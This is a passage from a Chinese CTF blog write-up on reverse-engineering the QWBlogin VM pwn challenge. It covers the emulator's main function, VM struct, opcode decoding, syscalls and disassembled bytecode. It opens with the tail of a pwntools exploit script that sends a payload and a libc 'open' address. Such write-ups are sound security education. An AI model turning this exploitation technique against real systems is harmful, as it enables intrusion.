class=\"hljs-string\">&quot;\\x8f\\x01&quot;</span>\n\nio.send(payload)\n\nsleep(<span class=\"hljs-number\">0.03</span>)\n\nio.send(p64(libc.sym[<span class=\"hljs-string\">&#x27;open&#x27;</span>]))\n\nio.interactive()\nio.close()\n</code></pre>\n\n","site":{"data":{"fluid_config":{"favicon":"/img/favicon.png","apple_touch_icon":"/img/favicon.png","title_join_string":" - ","force_https":false,"highlight":{"enable":true,"style":"Github Gist","bg_color":false,"copy_btn":true},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"tajs":null,"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"0x13","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"category","link":"/categories/","icon":"iconfont icon-category-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":false,"source":"busuanzi","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/default.png","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":false,"tag":true}},"page":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/default.png","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"{} 字"},"min2read":{"enable":true,"format":"{} 分钟","words":100},"views":{"enable":false,"source":"busuanzi","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":false,"type":"disqus"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":null,"appkey":null,"placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":null},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"archive":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null},"category":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"post_limit":10,"order_by":"-length"},"tag":{"banner_img":"/img/default.png","banner_img_height":80,"banner_mask_alpha":0.3,"subtitle":null,"tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"avatar":"/img/avatar.png","name":"Vang3lis","introduce":"","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com/Vang3lis","tip":"GitHub"}]},"page404":{"banner_img":"/img/default.png","banner_img_height":85,"banner_mask_alpha":0.3,"subtitle":"Page not found"},"links":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"items":[{"title":"M4x","link":"https://m4x.fun"},{"title":"Lancern","link":"https://lancern.github.io"},{"title":"ZPY","link":"https://github.com/peterzpy"},{"title":"felinae98","link":"https://code.felinae98.cn"},{"title":"Aloxaf","link":"https://aloxaf.com"},{"title":"FKY","link":"https://blog.fkynjyq.com"},{"title":"l1b0","link":"https://l1b0.fun/"}]}}}},"excerpt":"","more":"<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p>\n<p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p>\n<h2 id=\"QWBlogin\"><a href=\"#QWBlogin\" class=\"headerlink\" title=\"QWBlogin\"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p>\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><h4 id=\"main-函数\"><a href=\"#main-函数\" class=\"headerlink\" title=\"main 函数\"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">int</span> argc, <span class=\"hljs-keyword\">char</span>** argv)</span></span>\n<span class=\"hljs-function\"></span>&#123;\n    len = sub_ba0(argv[<span class=\"hljs-number\">1</span>]);\n    <span class=\"hljs-keyword\">if</span>(len &lt;= <span class=\"hljs-number\">0</span>)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    fd = open(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">0</span>);\n    <span class=\"hljs-keyword\">if</span>(fd &lt; <span class=\"hljs-number\">0</span>)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    v8 = mmap(<span class=\"hljs-number\">0</span>, len, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, fd, <span class=\"hljs-number\">0</span>);\n    <span class=\"hljs-keyword\">if</span>(!v8)\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n    \n    <span class=\"hljs-comment\">// check image format</span>\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">memcmp</span>(v8, <span class=\"hljs-string\">&quot;\\x61\\xde\\x10\\ef&quot;</span>, <span class=\"hljs-number\">4</span>))\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">2</span>);\n    \n    <span class=\"hljs-comment\">// check lenth</span>\n    <span class=\"hljs-comment\">// segment?</span>\n\n    <span class=\"hljs-comment\">// v8[6, 14) ~ [14, 22) lenth</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">6</span>) &gt; len || *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">14</span>) &gt; len - *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">6</span>) )\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">3</span>);\n    \n    <span class=\"hljs-comment\">// v8[22, 30) ~ [30, 38)</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">22</span>) &gt; len || *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">30</span>) &gt; len - *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">22</span>) )\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">4</span>);\n\n    <span class=\"hljs-comment\">// v[38, 46) &gt; v8[14, 22)</span>\n    <span class=\"hljs-keyword\">if</span>( *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">38</span>) &gt;= *(<span class=\"hljs-keyword\">int64_t</span>*)(v8+<span class=\"hljs-number\">14</span>) ) \n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">5</span>);\n\n    v9 = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">0xD0</span>, <span class=\"hljs-number\">1</span>);\n    <span class=\"hljs-comment\">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>\n    <span class=\"hljs-comment\">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>\n    v9[<span class=\"hljs-number\">21</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, v8[<span class=\"hljs-number\">14</span>, <span class=\"hljs-number\">22</span>))\n    <span class=\"hljs-built_in\">memcpy</span>(v9[<span class=\"hljs-number\">21</span>], &amp;(v8[v8[<span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">14</span>)]),  v8[<span class=\"hljs-number\">14</span>, <span class=\"hljs-number\">22</span>))\n    v[<span class=\"hljs-number\">20</span>] = segment_size;\n\n    <span class=\"hljs-comment\">// </span>\n    v9[<span class=\"hljs-number\">23</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, v8[<span class=\"hljs-number\">30</span>, <span class=\"hljs-number\">38</span>))\n    <span class=\"hljs-built_in\">memcpy</span>(v9[<span class=\"hljs-number\">23</span>], &amp;(v8[v8[<span class=\"hljs-number\">22</span>, <span class=\"hljs-number\">30</span>)]), v8[<span class=\"hljs-number\">30</span>, <span class=\"hljs-number\">38</span>))\n    v9[<span class=\"hljs-number\">22</span>] = segment_size; \n\n    v9[<span class=\"hljs-number\">25</span>] = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0x20</span> <span class=\"hljs-number\">000</span>);\n    v9[<span class=\"hljs-number\">24</span>] = <span class=\"hljs-number\">0x20</span> <span class=\"hljs-number\">000</span>;\n    v9[<span class=\"hljs-number\">18</span>] = v8[<span class=\"hljs-number\">38</span>, <span class=\"hljs-number\">46</span>)\n\n    g_Var = <span class=\"hljs-built_in\">calloc</span>(<span class=\"hljs-number\">0x18</span>, <span class=\"hljs-number\">1</span>);\n    <span class=\"hljs-built_in\">memset</span>(g_Var, <span class=\"hljs-number\">0x18</span>, <span class=\"hljs-number\">0</span>);\n\n    <span class=\"hljs-comment\">//链表结构 可能记录 segment flag 的</span>\n    <span class=\"hljs-comment\">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>\n    \n          \n    <span class=\"hljs-keyword\">while</span>(!sub_c1a(v9))\n    &#123;&#125;\n&#125;</code></pre>\n\n<p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p>\n<h4 id=\"VM-struct\"><a href=\"#VM-struct\" class=\"headerlink\" title=\"VM struct\"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">VM</span></span>\n<span class=\"hljs-class\">&#123;</span>\n    <span class=\"hljs-keyword\">int64_t</span> r00;\n    <span class=\"hljs-keyword\">int64_t</span> r01;\n    <span class=\"hljs-keyword\">int64_t</span> r02;\n    <span class=\"hljs-keyword\">int64_t</span> r03;\n    <span class=\"hljs-keyword\">int64_t</span> r04;\n    <span class=\"hljs-keyword\">int64_t</span> r05;\n    <span class=\"hljs-keyword\">int64_t</span> r06;\n    <span class=\"hljs-keyword\">int64_t</span> r07;\n    <span class=\"hljs-keyword\">int64_t</span> r08;\n    <span class=\"hljs-keyword\">int64_t</span> r09;\n    <span class=\"hljs-keyword\">int64_t</span> r0a;\n    <span class=\"hljs-keyword\">int64_t</span> r0b;\n    <span class=\"hljs-keyword\">int64_t</span> r0c;\n    <span class=\"hljs-keyword\">int64_t</span> r0d;\n    <span class=\"hljs-keyword\">int64_t</span> r0e;\n    <span class=\"hljs-keyword\">int64_t</span> r0f;\n    <span class=\"hljs-keyword\">int64_t</span> r10;\n    <span class=\"hljs-keyword\">int64_t</span> r11;\n    <span class=\"hljs-keyword\">int64_t</span> pc;             <span class=\"hljs-comment\">// vm[0x12]</span>\n    <span class=\"hljs-keyword\">int64_t</span> flags;          <span class=\"hljs-comment\">// vm[0x13]</span>\n    <span class=\"hljs-keyword\">int64_t</span> text_size;      <span class=\"hljs-comment\">// vm[0x14]</span>\n    <span class=\"hljs-keyword\">int64_t</span> text_segment;   <span class=\"hljs-comment\">// vm[0x15]</span>\n    <span class=\"hljs-keyword\">int64_t</span> data_size;      <span class=\"hljs-comment\">// vm[0x16]</span>\n    <span class=\"hljs-keyword\">int64_t</span> data_segment;   <span class=\"hljs-comment\">// vm[0x17]</span>\n    <span class=\"hljs-keyword\">int64_t</span> io_file;        <span class=\"hljs-comment\">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>\n    <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-built_in\">stack</span>;          <span class=\"hljs-comment\">// vm[0x19]</span>\n    <span class=\"hljs-comment\">// int64_t </span>\n&#125;;</code></pre>\n\n<p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p>\n<h4 id=\"op-1\"><a href=\"#op-1\" class=\"headerlink\" title=\"op[1]\"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-keyword\">switch</span> op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x0b</span>, <span class=\"hljs-number\">0xc</span>, <span class=\"hljs-number\">0xd</span>, <span class=\"hljs-number\">0xe</span>, \n        <span class=\"hljs-number\">4</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x03</span>, <span class=\"hljs-number\">0x04</span>,\n        <span class=\"hljs-number\">0xb</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x5</span>:\n        <span class=\"hljs-number\">0x15</span>: <span class=\"hljs-keyword\">int8_t</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-number\">0x25</span>: <span class=\"hljs-keyword\">int16_t</span> <span class=\"hljs-number\">5</span>\n        <span class=\"hljs-number\">0x35</span>: <span class=\"hljs-keyword\">int32_t</span> <span class=\"hljs-number\">7</span>\n        <span class=\"hljs-number\">0x45</span>: <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-number\">0xb</span> \n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x6</span>:\n        <span class=\"hljs-number\">3</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x7</span>:\n        <span class=\"hljs-number\">0x17</span>: <span class=\"hljs-keyword\">int8_t</span> <span class=\"hljs-number\">3</span>\n        <span class=\"hljs-number\">0x27</span>: <span class=\"hljs-keyword\">int16_t</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-number\">0x37</span>: <span class=\"hljs-keyword\">int32_t</span> <span class=\"hljs-number\">6</span>\n        <span class=\"hljs-number\">0x47</span>: <span class=\"hljs-keyword\">int64_t</span> <span class=\"hljs-number\">10</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x8</span>:\n        <span class=\"hljs-keyword\">if</span> op[<span class=\"hljs-number\">0</span>] == <span class=\"hljs-number\">0x20</span>:\n            <span class=\"hljs-number\">2</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-number\">10</span>\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0x9</span>:\n        <span class=\"hljs-keyword\">if</span> op[<span class=\"hljs-number\">0</span>] != <span class=\"hljs-number\">0x20</span> &amp;&amp; a[<span class=\"hljs-number\">0x14</span>] - a[<span class=\"hljs-number\">0x12</span>] &lt; <span class=\"hljs-number\">10</span>\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">0xa</span>:\n        <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-keyword\">default</span>:\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;</code></pre>\n\n\n\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p>\n<h4 id=\"整理\"><a href=\"#整理\" class=\"headerlink\" title=\"整理\"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># 20_syscall.c</span>\nswitch op[<span class=\"hljs-number\">0</span>]:\n\n// SYSCALL\n// size == <span class=\"hljs-number\">2</span>\ncase <span class=\"hljs-number\">0x20</span>:\n    r00 == <span class=\"hljs-number\">0</span>\n        op[<span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0xa</span>\n        \n        fd = open(data[r01], r02)\n        insert fd into vm.io_file\n\n    r00 == <span class=\"hljs-number\">1</span>\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x8</span>:\n            read(r01, data[r02], r03)\n\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x9</span>\n            read(r01, stack[r02], r03)\n\n    r00 == <span class=\"hljs-number\">2</span>\n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x8</span>:\n            write(r01, data[r02], r03)\n        \n        op[<span class=\"hljs-number\">1</span>]&amp;<span class=\"hljs-number\">0xf</span> == <span class=\"hljs-number\">0x9</span>:\n            write(r01, stack[r02], r03)\n\n    r00 == <span class=\"hljs-number\">3</span>\n        close(r01)</code></pre>\n\n\n\n<h4 id=\"简易-emulator\"><a href=\"#简易-emulator\" class=\"headerlink\" title=\"简易 emulator\"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p>\n<pre><code class=\"hljs x86asm\">ov <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x45</span>\n<span class=\"hljs-keyword\">call</span> <span class=\"hljs-number\">0x45</span> <span class=\"hljs-number\">0x1</span> <span class=\"hljs-number\">0x53</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa756f5920656553</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x8</span>\n<span class=\"hljs-keyword\">syscall</span> stack\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x23</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x28</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0xb</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">dword</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x51</span>\t\t\t\t|Q\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x57</span>\t\t\t\t| W\n<span class=\"hljs-keyword\">jne</span> <span class=\"hljs-number\">0x3</span>\n<span class=\"hljs-keyword\">jmp</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x77</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x26</span>\t\t\t\t| Q\n<span class=\"hljs-keyword\">jne</span> <span class=\"hljs-number\">0xffffffc9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x48</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x50</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x58</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x60</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span 